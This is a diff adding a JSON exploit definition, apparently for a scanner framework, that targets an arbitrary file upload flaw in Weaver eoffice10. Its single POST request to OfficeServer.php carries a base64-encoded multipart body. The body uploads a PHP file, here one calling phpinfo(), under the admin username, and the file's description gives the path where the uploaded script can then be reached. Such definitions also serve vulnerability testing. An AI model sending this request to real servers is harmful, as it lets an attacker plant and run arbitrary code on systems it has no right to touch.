@@ -1,0 +1,14 @@
+{
+    "step": 1,
+    "description": "\u6cdb\u5faeeoffice10\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\n\u6587\u4ef6\u540d\uff1a'FILENAME':'test.php'\n\u5730\u5740\uff1a /eoffice10/server/public/iWebOffice2015/Document/test.php",
+    "exploit": [
+        {
+            "method": "POST",
+            "path": "/eoffice10/server/public/iWebOffice2015/OfficeServer.php",
+            "header": {
+                "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryLpoiBFy4ANA8daew"
+            },
+            "body": "LS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5THBvaUJGeTRBTkE4ZGFldwpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7bmFtZT0iRmlsZURhdGEiO2ZpbGVuYW1lPSJ0ZXN0LnBocCIKQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0KCjw/cGhwCnBocGluZm8oKTsKPz4KCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeUxwb2lCRnk0QU5BOGRhZXcKQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhO25hbWU9IkZvcm1EYXRhIgoKeydVU0VSTkFNRSc6J2FkbWluJywnUkVDT1JESUQnOid1bmRlZmluZWQnLCdPUFRJT04nOidTQVZFRklMRScsJ0ZJTEVOQU1FJzondGVzdC5waHAnfQotLS0tLS1XZWJLaXRGb3JtQm91bmRhcnlMcG9pQkZ5NEFOQThkYWV3LS0="
+        }
+    ]
+}
